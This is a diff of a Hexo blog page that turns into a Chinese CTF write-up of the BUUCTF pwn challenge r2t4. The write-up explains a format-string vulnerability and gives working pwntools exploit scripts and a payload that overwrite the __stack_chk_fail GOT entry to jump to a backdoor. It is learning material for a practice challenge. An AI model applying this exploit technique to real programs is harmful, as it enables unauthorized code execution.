@@ -17,18 +17,21 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>categories | solo</title>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="categories">
-<meta property="og:url" content="http://example.com/categories/index.html">
+  <title>buuctf-r2t4 | solo</title>
+  <meta name="description" content="buuctf-r2t4这题我不知道怎么说的很无语子 是他没开pie，其他全开 有格式化字符串 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  char buf; &#x2F;&#x2F; [rsp+0h] [rbp-30h]  unsigned __int64 v5; &#x2F;&#x2F; [rsp+28h] [rb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-r2t4">
+<meta property="og:url" content="http://example.com/2021/11/23/buuctf-r2t4/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="buuctf-r2t4这题我不知道怎么说的很无语子 是他没开pie，其他全开 有格式化字符串 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  char buf; &#x2F;&#x2F; [rsp+0h] [rbp-30h]  unsigned __int64 v5; &#x2F;&#x2F; [rsp+28h] [rb">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-11-10T07:44:28.000Z">
-<meta property="article:modified_time" content="2021-11-10T07:44:28.739Z">
+<meta property="article:published_time" content="2021-11-23T12:51:53.000Z">
+<meta property="article:modified_time" content="2021-11-23T12:55:16.196Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="buuctf-pwn">
 <meta name="twitter:card" content="summary">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/categories/index.html">
+  <link rel="canonical" href="http://example.com/2021/11/23/buuctf-r2t4/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -338,14 +341,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="page-" class="article article-type-page" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-buuctf-r2t4" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      categories
+      buuctf-r2t4
     </h1>
   
 
@@ -353,22 +356,53 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/categories/index.html" class="article-date">
-	  <time datetime="2021-11-10T07:44:28.000Z" itemprop="datePublished">2021-11-10</time>
+	<a href="/2021/11/23/buuctf-r2t4/" class="article-date">
+	  <time datetime="2021-11-23T12:51:53.000Z" itemprop="datePublished">2021-11-23</time>
 	</a>
 </span>
         
         
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/buuctf-pwn/" rel="tag">buuctf-pwn</a>
+  </span>
+
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/categories/index.html#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/23/buuctf-r2t4/#comments" class="article-comment-link">评论</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        
+        <h1 id="buuctf-r2t4"><a href="#buuctf-r2t4" class="headerlink" title="buuctf-r2t4"></a>buuctf-r2t4</h1><p>这题我不知道怎么说的很无语子</p>
+<p>是他没开pie，其他全开</p>
+<p>有格式化字符串</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本来我的思路是格式化字符串拿到Canary然后正常溢出+Canary来获取get flag但是好像不是那个回事得整不会了直接看wp看的稀里糊涂的是格式化字符串修改got表然后整了一波看的懂好像又不懂的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">要想利用格式化字符串漏洞，首先要了解格式化字符</span><br><span class="line">其中格式化字符有：</span><br><span class="line"></span><br><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line"></span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line"></span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节）</span><br><span class="line">%nh:将写入的地址空间为2字节,</span><br><span class="line">%hhn表示写入的地址空间为1字节</span><br><span class="line">%$hhn表示写入的地址空间为1字节</span><br><span class="line">%$lln表示写入的地址空间为8字节，</span><br><span class="line">在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</span><br></pre></td></tr></table></figure>
+
+<p>找字符串偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r</span><br><span class="line">输入aaaaa</span><br><span class="line">pwndbg&gt; search aaaa				<span class="comment">#找字符串aaaa</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdda0</span> <span class="number">0xa616161616161</span> /* <span class="string">&#x27;aaaaaa\n&#x27;</span> */</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7fffffffdda0</span></span><br><span class="line">The index of <span class="built_in">format</span> argument : <span class="number">7</span> (<span class="string">&quot;\%6$p&quot;</span>)				<span class="comment">#得到偏移</span></span><br></pre></td></tr></table></figure>
+
+<p>现在就是怎么构造的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%64c%<span class="number">9</span>$hn%1510c%<span class="number">10</span>$hnaaa</span><br></pre></td></tr></table></figure>
+
+<p>看他们的发现说哪个程序会输入大量的字符串同时拆开不是个小数目,我们就要用%numc这种格式输入多少个字符串</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">64:对应高地址(0x40)的10进制</span><br><span class="line"></span><br><span class="line">9:关于这个9我的建议是先写payload，写好具体长度是多少再写上</span><br><span class="line">由于格式化字符串<span class="comment">%64c%9$hn%1510c%10$hnaaa占用了24个字节，根据64位程序，24/8=3,所以偏移是6+3=9，配合上$hn使用构成%9$hn,将64（0x40）写入偏移为9的位置，对应的是__stack_chk_fail+2</span></span><br><span class="line"></span><br><span class="line">1510：1510+64=1574=0x626，对应backdoor函数地址的低两字节0x0626</span><br><span class="line"></span><br><span class="line">10 ：在偏移9的基础上加上p64(<span class="built_in">_</span><span class="built_in">_</span>stack<span class="built_in">_</span>chk<span class="built_in">_</span>fail+2)地址的一字节，即偏移为10</span><br><span class="line"></span><br><span class="line">aaa：填充作用，随便写，使之为8的倍数让栈对齐</span><br><span class="line"></span><br><span class="line">p64(<span class="built_in">_</span><span class="built_in">_</span> stack<span class="built_in">_</span>chk<span class="built_in">_</span>fail+2) + p64(<span class="built_in">_</span><span class="built_in">_</span>stack<span class="built_in">_</span>chk<span class="built_in">_</span>fail) ：将backdoor函数地址分为高两个字节和低两字节进行写入</span><br><span class="line">数据传入是小端传序，从checksec可以看出       Arch:     amd64-64-little</span><br><span class="line">所以我们先传后面两个字节也就是更改<span class="built_in">_</span><span class="built_in">_</span> stack<span class="built_in">_</span>chk<span class="built_in">_</span>fail+2</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote(&#x27;node3.buuoj.cn&#x27;,29883)</span></span><br><span class="line">r = process(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%64c%9$hn%1510c%10$hnaaa&quot;</span> + p64(__stack_chk_fail+<span class="number">2</span>) + p64(__stack_chk_fail)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>我只是明白这个模版是怎么用的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,word_size=<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x0000000000400626</span></span><br><span class="line">p = process(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;__stack_chk_fail:backdoor&#125;).ljust(<span class="number">0x38</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>模版的使用:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__stack_chk_fail=要修改的地址</span><br><span class="line">backdoor=填充的字符串溢出触发Canary</span><br><span class="line">6=字符串的偏移</span><br></pre></td></tr></table></figure>
+
+<p>总结:开始得了把好像又清楚好像又不清楚</p>
+
       
     </div>
     <div class="article-footer">
@@ -377,7 +411,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://example.com/categories/index.html" title="categories" target="_blank" rel="external">http://example.com/categories/index.html</a>
+      <a href="http://example.com/2021/11/23/buuctf-r2t4/" title="buuctf-r2t4" target="_blank" rel="external">http://example.com/2021/11/23/buuctf-r2t4/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -420,6 +454,16 @@
 
   <nav class="bar bar-footer clearfix" data-stick-bottom>
   <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2021/11/13/pwn-canary%E7%9A%84gdb%E8%B0%83%E8%AF%95%E5%B0%8F%E8%8A%82(1)/" title="pwn-canary的gdb调试小节"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
   
   
   <!-- Button trigger modal -->
@@ -539,6 +583,10 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
+
+
+
+   
 
 
 
